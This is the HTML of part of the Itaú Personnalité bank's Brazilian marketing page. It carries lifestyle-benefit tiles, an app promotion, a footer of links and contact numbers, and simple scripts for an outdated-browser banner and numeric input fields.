							<div class="col-12 pb-md-3">								
								
    

	<section aria-label="gastronomia" class="pt-0">
		<a class="mosaic-link" title="saiba mais sobre a gastronomia Personnalité" href="https://www.itau.com.br/personnalite/experiencia/#section3"></a>
		<div class="mosaic mosaic--wide " link="https://www.itau.com.br/personnalite/experiencia/#section3">
			<picture class="mosaic__image">
				<source srcset="https://www.itau.com.br/content/dam/itau/personalite/clientes-itau-personnalite-saboreando-uma-refeicao-em-um-restaurante-mobile.jpg" media="(max-width: 320px)" alt="Casal de clientes Itaú Personnalité saboreando uma refeição em um restaurante."/>
				<img srcset="https://www.itau.com.br/content/dam/itau/personalite/clientes-itau-personnalite-saboreando-uma-refeicao-em-um-restaurante.jpg" alt="Casal de clientes Itaú Personnalité saboreando uma refeição em um restaurante."/>
			</picture>
			<div class="mosaic__content">
				<div class="mosaic__inner-content">
					<ul class="mosaic__icons">
						
							<li class="mosaic__icons-item">
								<i class="icon-itaufonts_alimentacao icon" aria-hidden="true" tabindex="-1"></i>
							</li>
						
					</ul>
					<h3>gastronomia</h3>
					<p>o melhor da gastronomia com benefícios exclusivos</p>

				</div>
			</div>
		</div>

		
	</section>
							</div>
						</div>

						<div class="row">
							<div class="col-12 col-sm-12 col-md-6">
								
    

	<section aria-label="viagem" class="pt-0">
		<a class="mosaic-link" title="saiba mais sobre a viagem Personnalité" href="https://www.itau.com.br/personnalite/experiencia/#section4"></a>
		<div class="mosaic mosaic--small-1 " link="https://www.itau.com.br/personnalite/experiencia/#section4">
			<picture class="mosaic__image">
				<source srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-itau-personnalite-viajando-de-carro-ao-por-do-sol-mobile.jpg" media="(max-width: 320px)" alt="Casal de clientes Itaú Personnalité viajando de carro ao por do sol."/>
				<img srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-itau-personnalite-viajando-de-carro-ao-por-do-sol.jpg" alt="Casal de clientes Itaú Personnalité viajando de carro ao por do sol."/>
			</picture>
			<div class="mosaic__content">
				<div class="mosaic__inner-content">
					<ul class="mosaic__icons">
						
							<li class="mosaic__icons-item">
								<i class="icon-itaufonts_viagem icon" aria-hidden="true" tabindex="-1"></i>
							</li>
						
					</ul>
					<h3>viagem</h3>
					<p>experiências ainda mais especiais</p>

				</div>
			</div>
		</div>

		
	</section>
							</div>
							<div class="col-12 col-sm-12 col-md-6">
								
    

	<section aria-label="cultura" class="pt-0">
		<a class="mosaic-link" title="saiba mais sobre a cultura Personnalité" href="https://www.itau.com.br/personnalite/experiencia/#section6"></a>
		<div class="mosaic mosaic--small-2 " link="https://www.itau.com.br/personnalite/experiencia/#section6">
			<picture class="mosaic__image">
				<source srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-de-clientes-itau-personnalite-se-abracando-enquanto-a-mulher-pinta-um-quadro-mobile.jpg" media="(max-width: 320px)" alt="Casal de clientes Itaú Personnalité se abraçando enquanto a muler pinta um quadro."/>
				<img srcset="https://www.itau.com.br/content/dam/itau/personalite/casal-de-clientes-itau-personnalite-se-abracando-enquanto-a-mulher-pinta-um-quadro.jpg.jpg" alt="Casal de clientes Itaú Personnalité se abraçando enquanto a muler pinta um quadro."/>
			</picture>
			<div class="mosaic__content">
				<div class="mosaic__inner-content">
					<ul class="mosaic__icons">
						
							<li class="mosaic__icons-item">
								<i class="icon-itaufonts_50_teatro icon" aria-hidden="true" tabindex="-1"></i>
							</li>
						
					</ul>
					<h3>cultura</h3>
					<p>momentos de lazer e emoção inesquecíveis</p>

				</div>
			</div>
		</div>

		
	</section>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- [END: MOSAICS] -->

			<!-- [BEGIN: INVERTED MOSAICS]-->
			
			<!-- [END: INVERTED MOSAICS] -->
		</div>
	</section>
</div>
<div class="image-with-text aem-GridColumn aem-GridColumn--default--12">
    

<section class="module row-modal bg-grey-personalite ">
	<div class="container">
		<div class="row  align-items-center no-row-modal">
			
			<div class="image-with-text__image col-sm-6  ">
				
				<img src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-feliz-com-seu-filho-nos-ombros.jpg" alt="Cliente Itaú Personnalité feliz carregando seu filho nos ombros." class="img-fluid" tabindex="-1" aria-hidden="true"/>
				
			</div>


			<div class="col-sm-6 ">
               <div class="content">
				   <div class="inner-content ">
						<div>
<p>feito para você</p>
<h2>ainda não é Personnalité?</h2>
<p>Abra sua conta e descubra todos os benefícios de um relacionamento próximo e surpreendente, do seu jeito e no seu tempo.</p>

</div>
				   </div>
				   <div class='row'>
				   
				   
			</div>
				   <a role="button" href="https://www.itau.com.br/personnalite/seja" class="  button">seja Personnalité</a>
				</div>
           </div>
		  
		 
       </div>
	</div>

	<!-- Modal

	
	<sly data-sly-test="">
		<div id="modalContent_" class="modal fade" data-easein="fadeIn" role="dialog">
			<div class="modal-dialog modal-lg">
			
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">
							<span class="icon-itaufonts_fechar"></span>
						</button>
						<h2 class="modal-title"></h2>
					</div>
					<div class="modal-body">
						<img src="" alt="" title="" align="left" class="img-left">
						

						<div class="row">
							<div class="col-md-12 lista-modal">
								<h5 data-sly-test=></h5>

								<sly data-sly-unwrap data-sly-list.icon="">
									<div class="col-md-3">
										<span class=""></span>
										<p></p>
									</div>
								</sly>
							</div>
						</div>
					</div>
					<div class="modal-footer" data-sly-test=>
						<div class="col-md-12">
							<p></p>
						</div>
					</div>
				</div>
			</div>
		</div>
	</sly> -->

</section>
</div>
<div class="button-help aem-GridColumn aem-GridColumn--default--12">
    


<a href="https://www.itau.com.br/atendimento-itau/para-voce/" role="button" aria-label="dúvidas" target="_self" class="${properties.buttonCSSAnalytics} but-duvidas">
    <span class="icon-itaufonts_ajuda"></span>
    <p>dúvidas</p>
</a></div>
<div class="image-icon aem-GridColumn aem-GridColumn--default--12">
    


<section class="image-icon__inner col-md-12 col-xs-12 bg-white">
    <div class="container-fluid px-0">
    </div>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-sm-12 image-icon__content">
                <p class="image-icon__overright">seja digital</p>
                <h2 class="image-icon__title">app Itaú Personnalité no celular</h2>

                <div class="image-icon__description">
<p>Acesse sua conta de onde estiver, como preferir, e conte com o banco na palma da mão.</p>

</div>
                
                
                
                <ul class=" image-icon__list d-flex justify-content-lg-start justify-content-between justify-content-md-start">
                    
                        
                        <li class="image-icon__list-item">
                            <span class="image-icon__icon-wrapper">
                                <i class="icon-itaufonts_celular icon" aria-hidden="true" role="presentation" tabindex="-1"></i>
                            </span>    
                            <p class="image-icon-title">teclado Itaú       </p>
                            <p class="image-icon-description"></p>
                        </li>
                    
                        
                        <li class="image-icon__list-item">
                            <span class="image-icon__icon-wrapper">
                                <i class="icon-itaufonts_cartao icon" aria-hidden="true" role="presentation" tabindex="-1"></i>
                            </span>    
                            <p class="image-icon-title">cartão virtual</p>
                            <p class="image-icon-description"></p>
                        </li>
                    
                        
                        <li class="image-icon__list-item">
                            <span class="image-icon__icon-wrapper">
                                <i class="icon-itaufonts_itoken_aplicativo icon" aria-hidden="true" role="presentation" tabindex="-1"></i>
                            </span>    
                            <p class="image-icon-title">itoken</p>
                            <p class="image-icon-description"></p>
                        </li>
                    
                        
                        <li class="image-icon__list-item">
                            <span class="image-icon__icon-wrapper">
                                <i class="icon-itaufonts_cheque icon" aria-hidden="true" role="presentation" tabindex="-1"></i>
                            </span>    
                            <p class="image-icon-title">depósito de cheque</p>
                            <p class="image-icon-description"></p>
                        </li>
                    
                </ul>
                
                <a id="-" href="https://app.adjust.com/2ck7cti_97qgik0?&campaign=Home_Personnalite&adgroup=&creative=&fallback=http%3A%2F%2Fwww.itau.com.br/personnalite/onde-estiver/" class="  image-icon__button" target="_top" role="button" aria-label='baixe o App Itaú Personnalité'>
                        conheça o app
                </a>
            </div>
            <div class="col-md-4 d-none d-lg-block pr-0 image-icon__image image-icon__image--fill">
                <img class='d-xl-block d-lg-none' src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-na-praia-consulta-seu-celular.jpg" alt="Cliente Itaú Personnalité na praia consulta seu celular." align="right" aria-hidden="true" role="presentation" tabindex="-1"/>
                <img class='d-xl-none d-lg-block' src="https://www.itau.com.br/content/dam/itau/personalite/cliente-itau-personnalite-na-praia-consulta-seu-celular-mobile.jpg" alt="Cliente Itaú Personnalité na praia consulta seu celular." align="right" aria-hidden="true" role="presentation" tabindex="-1"/>
            </div>
        </div>
    </div>
</section></div>

    
</div></div>
<div class="footer aem-GridColumn aem-GridColumn--default--12">
    


<footer id="footer">
    <div class="row no-gutters">
        <div class="upper-footer col-12">
            <div class="container">
                <section id="breadcrumb-section" class="breadcrumb-section">
    <div id="breadcrumb-container" class="container">
        <ol class="breadcrumb" aria-label="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
            <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem" class="breadcrumb-item" aria-current="page">
                
                    <span itemprop="name">
                        Personnalité
                    </span>
                
                
                <meta itemprop="position" content="0"/>
            </li>
        </ol>
        
    

    </div>
</section>
            </div>
        </div>
        <div class="middle-footer col-12">
            <div id="links-footer-mobile" class="accordion d-block d-md-none">
                
            </div>
            <div class="container links-footer">
                <div class="row">
                    <div class="col-4 col-lg-3 d-none d-md-block">
                        <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">serviços</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_menu_hamburguer" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/voce" target="_self">para você</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_para_empresa" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/empresas" target="_self">para empresas</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_institucional" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/poder-publico" target="_self">para poder público</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_sifrao" aria-hidden="true"></span>
                    <a href="http://www.itau.com.br/conta-corrente/tarifas" target="_self">pacotes e tarifas</a>
                </li>
            </ul>
            
       
    
 


</div>


                    </div>
                    <div class="col-4 col-lg-3 d-none d-md-block">
                        <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">sobre o Itaú</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_institucional" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/sobre/quem-somos" target="_self">quem somos</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_investimento" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/relacoes-com-investidores/" target="_blank">relações com investidores</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_ger_dedicados" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/carreira" target="_self">carreiras</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_informacao" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/imprensa" target="_self">imprensa</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_sustentabilidade" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/sustentabilidade" target="_self">sustentabilidade</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/itaubba-pt/analises-economicas/publicacoes" target="_self">análises econômicas</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_seguranca" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/seguranca/termos-de-uso" target="_self">termos de uso e privacidade</a>
                </li>
            </ul>
            
       
    
 


</div>


                    </div>
                    <div class="col-4 col-lg-3 d-none d-md-block">
                        <div class="common-links cmp-common__basic section">
    



      
        
        <span class="column-title">ajuda</span>
      
            <ul>
                <li>
                    <span class="icon-itaufonts_atendimento_2" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-itau/para-voce" target="_self">central de ajuda</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_email_resp_rapida" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-empresas/envie-mensagem" target="_self">envie sua mensagem</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_50_cinema" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/atendimento-itau/para-voce/denuncia" target="_self">denúncia</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_aplicativos" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/canais-itau/" target="_self">canais Itaú</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_agencia" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/#localizador" target="_self">encontre agências</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_seguranca" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/seguranca" target="_self">segurança</a>
                </li>
            
                <li>
                    <span class="icon-itaufonts_senha" aria-hidden="true"></span>
                    <a href="https://www.itau.com.br/mais-acessos" target="_self">acessos não correntista</a>
                </li>
            </ul>
            
       
    
 


</div>


                    </div>
                    <div class="col-12 col-lg-3 d-none d-lg-block">
                        <div class="row no-gutters justify-content-between">
                            <div class="col-12 col-md-4 col-lg-12">
                                
    



	<div class="social-media">
        <span aria-label="acompanhe as redes sociais">acompanhe</span>
        <div class="social-icons">
        	
                <a class="icon-itaufonts_full_instagram" href="https://www.instagram.com/itaupersonnalite/" target="_blank" role="button" aria-label="Instagram" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_video" href="https://www.youtube.com/itaupersonnalite" target="_blank" role="button" aria-label="Youtube" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_facebook" href="https://www.facebook.com/itaupersonnalite" target="_blank" role="button" aria-label="Facebook" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_twitter" href="https://twitter.com/@personnalite360" target="_blank" role="button" aria-label="Twitter" rel="nofollow"></a>
			
        </div>
    </div>





    <div class="json-ld">
        {
            "@context": "http://schema.org",
            "@type": "personnalite",
            "name": "Itaú",
            "url": "http://www.itau.com",
            "sameAs": [
                
                    "https://www.instagram.com/itaupersonnalite/" ,
                
                    "https://www.youtube.com/itaupersonnalite" ,
                
                    "https://www.facebook.com/itaupersonnalite" ,
                
                    "https://twitter.com/@personnalite360" 
                
            ]
        }
    </div>

                            </div>
                            <div itemscope itemtype="http://schema.org/Organization" class="col-12 col-md-4 col-lg-12 contact-segment">
                                <div class="row">
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">sac</p>
                                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/" data-phone="0800 728 0728" title="sac">
                                            <p class="contact-number">
                                                <span itemprop="telephone" content="+550800 728 0728">
                                                    0800 728 0728
                                                </span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">ouvidoria</p>
                                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/" data-phone="0800 570 0011" title="ouvidoria"> 
                                            <p class="contact-number">
                                                <span itemprop="telephone" content="+550800 570 0011">
                                                        0800 570 0011
                                                </span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">ouvidoria</p>  
                                        <a href="https://www.itau.com.br/ouvidoria" title="link externo">
                                            <p class="contact-number">
                                                <span>envie sua mensagem</span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <a href="https://www.consumidor.gov.br" title="link externo">
                                            <p class="contact-number">
                                                <span>consumidor.gov.br</span>
                                            </p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div> 
        </div>

        <div class="middle-footer col-12 d-lg-none">
            <div class="container">
                <div class="row no-gutters">
                    <div class="col-12 col-lg-3">
                        <div class="row no-gutters justify-content-between">
                            <div class="col-12 col-md-4 col-lg-12">
                                
    



	<div class="social-media">
        <span aria-label="acompanhe as redes sociais">acompanhe</span>
        <div class="social-icons">
        	
                <a class="icon-itaufonts_full_instagram" href="https://www.instagram.com/itaupersonnalite/" target="_blank" role="button" aria-label="Instagram" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_video" href="https://www.youtube.com/itaupersonnalite" target="_blank" role="button" aria-label="Youtube" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_facebook" href="https://www.facebook.com/itaupersonnalite" target="_blank" role="button" aria-label="Facebook" rel="nofollow"></a>
			
                <a class="icon-itaufonts_full_twitter" href="https://twitter.com/@personnalite360" target="_blank" role="button" aria-label="Twitter" rel="nofollow"></a>
			
        </div>
    </div>





    <div class="json-ld">
        {
            "@context": "http://schema.org",
            "@type": "personnalite",
            "name": "Itaú",
            "url": "http://www.itau.com",
            "sameAs": [
                
                    "https://www.instagram.com/itaupersonnalite/" ,
                
                    "https://www.youtube.com/itaupersonnalite" ,
                
                    "https://www.facebook.com/itaupersonnalite" ,
                
                    "https://twitter.com/@personnalite360" 
                
            ]
        }
    </div>

                            </div>
                            <div itemscope itemtype="http://schema.org/Organization" class="col-12 col-md-4 col-lg-12 contact-segment">
                                <div class="row">
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">sac</p>
                                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/" data-phone="0800 728 0728" title="sac">
                                            <p class="contact-number">
                                                <span itemprop="telephone" content="+550800 728 0728">
                                                    0800 728 0728
                                                </span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">ouvidoria</p>
                                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/" data-phone="0800 570 0011" title="ouvidoria">
                                            <p class="contact-number">
                                                <span itemprop="telephone" content="+550800 570 0011">
                                                    0800 570 0011
                                                </span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <p itemprop="name" class="contact-title">ouvidoria</p>  
                                        <a href="https://www.itau.com.br/ouvidoria" title="link externo">
                                            <p class="contact-number">
                                                <span>envie sua mensagem</span>
                                            </p>
                                        </a>
                                    </div>
                                    <div class="col-12 contact">
                                        <a href="https://www.consumidor.gov.br" title="link externo">
                                            <p class="contact-number">
                                                <span>consumidor.gov.br</span>
                                            </p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="lower-footer col-12">
            <div class="container">
                <div class="row no-gutters">
                    <div class="col-12 col-lg-6 col-xl-5">
                        <div class="links"> 
                           <!-- <li class="link-item"><a href="">mapa do site</a></li>
                                < class="link-item"><a href="">acessibilidade</a></li-->
                            <div class="dropup link-item">
                                <a href="#" data-toggle="dropdown" role="button" aria-expanded="false" aria-label="Troca de site. Brasil">Brasil <span class="icon-itaufonts_seta_down"></span></a>
                                <div class="dropdown-menu" role="menu">
                                    <div class="dropdown-menu-item"><a href="https://www.itau.com.ar/Paginas/default.aspx" aria-label="Argentina ir para o site">Argentina</a></div>
                                    <div class="dropdown-menu-item"><a href="https://www.itau.cl/" aria-label="Chile ir para o site">Chile</a></div>
                                    <div class="dropdown-menu-item"><a href="https://www.itau.co/index" aria-label="Colômbia ir para o site">Colômbia</a></div>
                                    <div class="dropdown-menu-item"><a href="https://www.itau.com.py/" aria-label="Paraguai ir para o site">Paraguai</a></div>
                                    <div class="dropdown-menu-item"><a href="https://www.itau.com.uy/inst/" aria-label="Uruguai ir para o site">Uruguai</a></div> 
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-12 col-lg-6 col-xl-7 legal-info">
                        <div class="row no-gutters">
                            
<div class="col-12 organization"><p>© 2020 Itaú Unibanco Holding S.A. CNPJ: 60.872.504/0001-23</p>
</div>
<div class="col-12 location"><p>Praça Alfredo Egydio de Souza Aranha, 100, Torre Olavo Setubal, Parque Jabaquara - CEP 04344-902 - São Paulo - Brasil</p>

</div>


                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer></div>

    
</div>

	<script type='text/javascript'>
		var htm2 = 	' <div id="certificados" style="line-height:1">' +
			' <div id="div_main" style="min-width:980px; width:100%; height:60px;background-color:#FFF">' +
			' <div id="div_text" style="font-size:12px;float:left; display:inline-block; padding:10px 120px">' +
			' <p style="line-height:20px;font-family:ItauDisplay-Light, Myriad Pro, Arial; color:black; font-size:15px"><b style="font-family:ItauDisplay-Light, Myriad Pro, Arial;font-size:18px">Atualize seu navegador para ter acesso a todos os recursos.</b><br>' +
			' Selecione uma das opções ao lado.</p>' +
			' </div>' +
			' <div id="div_img" style="display:inline-block;padding:10px 20px 10px 0;float:right;">' +
			' <ul style= "height:40px;padding:0;margin:0;">' +
			' <li style= "display:inline-block; padding : 0 1px; list-style: none;"><a href="https://www.itau.com.br/computador/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-app-itau.gif" style="border:0"></a></li>' +
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="https://www.google.com/intl/pt-BR/chrome/browser/?hl=pt-br" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-chrome.gif" style="border:0"></a></li>' +
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="http://www.mozilla.org/pt-BR/firefox/new/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-firefox.gif" style="border:0"></a></li>' +					
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="http://www.apple.com/br/safari/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-safari.gif" style="border:0"></a></li>' +
			' </ul>' +
			' </div>' +
			' </div>'; 
			if(navigator.userAgent.indexOf('MSIE 8.0') > -1){
				document.body.innerHTML = htm2;
				}
		</script>
	
	
    
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
$('#numeric').keyup(function() {
  $(this).val(this.value.replace(/D/g, ''));
});
</script>

<script>
$('#numeric1').keyup(function() {
  $(this).val(this.value.replace(/D/g, ''));
});
</script>

    
<script type="text/javascript" src="/etc.clientlibs/itau/clientlibs/clientlib-base.min.24e573bfd755e0fef6e129b8b7693945.js"></script>


</body>
</html>